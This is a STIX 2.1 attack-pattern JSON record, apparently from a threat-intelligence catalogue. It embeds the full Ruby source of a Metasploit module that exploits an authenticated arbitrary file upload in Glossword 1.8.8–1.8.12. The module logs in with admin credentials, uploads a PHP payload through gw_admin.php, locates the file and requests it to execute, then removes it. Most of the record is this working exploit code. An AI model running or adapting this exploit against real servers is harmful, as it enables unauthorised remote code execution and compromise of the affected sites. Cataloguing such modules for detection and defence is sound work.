{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--73bb2eeb-bb4c-46ca-81a2-bd9f64e9053e",
    "created": "2024-08-14T17:07:42.729975Z",
    "modified": "2024-08-14T17:07:42.729979Z",
    "name": "\"Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a file upload vulnerability in Glossword versions 1.8.8 to 1.8.12 when run as a standalone application. This application has an upload feature that allows an authenticated user with administrator roles to upload arbitrary files to the 'gw_temp/a/' directory.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/glossword_upload_exec.rb",
            "external_id": "glossword_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability\",\n        'Description' => %q{\n          This module exploits a file upload vulnerability in Glossword\n          versions 1.8.8 to 1.8.12 when run as a standalone application.\n          This application has an upload feature that allows an authenticated user\n          with administrator roles to upload arbitrary files to the 'gw_temp/a/'\n          directory.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'AkaStep', # Discovery\n          'bcoles' # metasploit exploit\n        ],\n        'References' => [\n          [ 'EDB', '24456' ],\n          [ 'OSVDB', '89960' ]\n        ],\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['Automatic Targeting', { 'auto' => true }]],\n        'Privileged' => true,\n        'DisclosureDate' => '2013-02-05',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/glossword/1.8/']),\n        OptString.new('USERNAME', [true, 'The username for Glossword', 'admin']),\n        OptString.new('PASSWORD', [true, 'The password for Glossword', 'admin'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    base = target_uri.path\n    peer = \"#{rhost}:#{rport}\"\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    # login\n    print_status(\"Authenticating as user '#{user}'\")\n    begin\n      res = login(base, user, pass)\n      if res\n        if res.code == 200\n          vprint_error(\"Authentication failed\")\n          return Exploit::CheckCode::Unknown\n        elsif res.code == 301 and res.get_cookies =~ /sid([\\da-f]+)=([\\da-f]{32})/\n          vprint_good(\"Authenticated successfully\")\n          return Exploit::CheckCode::Appears\n        end\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(\"#{@fname}\")\n    else\n      client.shell_command_token(\"rm #{@fname}\")\n    end\n  end\n\n  def upload(base, sid, fname, file)\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    data = Rex::MIME::Message.new\n    data.add_part(file, 'application/x-php', nil, \"form-data; name=\\\"file_location\\\"; filename=\\\"#{fname}\\\"\")\n    data.add_part(\"edit-own\", nil, nil, 'form-data; name=\"a\"')\n    data.add_part(\"users\", nil, nil, 'form-data; name=\"t\"')\n    data.add_part(\"Save\", nil, nil, 'form-data; name=\"post\"')\n    data.add_part(\"#{sid}\", nil, nil, 'form-data; name=\"sid\"')\n    data.add_part(\"#{user}\", nil, nil, 'form-data; name=\"arPost[login]\"')\n    data.add_part(\"#{pass}\", nil, nil, 'form-data; name=\"arPost[pass_new]\"')\n    data.add_part(\"#{pass}\", nil, nil, 'form-data; name=\"arPost[pass_confirm]\"')\n\n    data_post = data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(base, 'gw_admin.php'),\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data_post,\n    })\n\n    return res\n  end\n\n  def login(base, user, pass)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(base, 'gw_login.php'),\n      'data' => \"arPost%5Buser_name%5D=#{user}&arPost%5Buser_pass%5D=#{pass}&arPost%5Blocale_name%5D=en-utf8&a=login&sid=&post=Enter\"\n    })\n    return res\n  end\n\n  def exploit\n    base = target_uri.path\n    @fname = rand_text_alphanumeric(rand(10) + 6) + '.php'\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    # login; get session id and token\n    print_status(\"Authenticating as user '#{user}'\")\n    res = login(base, user, pass)\n    if res and res.code == 301 and res.get_cookies =~ /sid([\\da-f]+)=([\\da-f]{32})/\n      token = \"#{$1}\"\n      sid = \"#{$2}\"\n      print_good(\"Authenticated successfully\")\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    # upload PHP payload\n    print_status(\"Uploading PHP payload (#{payload.encoded.length} bytes)\")\n    php = %Q|<?php #{payload.encoded} ?>|\n    begin\n      res = upload(base, sid, @fname, php)\n      if res and res.code == 301 and res['location'] =~ /Setting saved/\n        print_good(\"File uploaded successfully\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Uploading PHP payload failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    # retrieve PHP file path\n    print_status(\"Locating PHP payload file\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, 'gw_admin.php?a=edit-own&t=users'),\n        'cookie' => \"sid#{token}=#{sid}\"\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n    if res and res.code == 200 and res.body =~ /<img width=\"\" height=\"\" src=\"([^\"]+)\"/\n      shell_uri = \"#{$1}\"\n      @fname = shell_uri.match('(\\d+_[a-zA-Z\\d]+\\.php)')\n      print_good(\"Found payload file path (#{shell_uri})\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to find PHP payload file path\")\n    end\n\n    # retrieve and execute PHP payload\n    print_status(\"Executing payload (#{shell_uri})\")\n    begin\n      send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(base, shell_uri),\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n    if !res or res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Executing payload failed\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-05",
    "x_mitre_platforms": [
        "php'"
    ]
}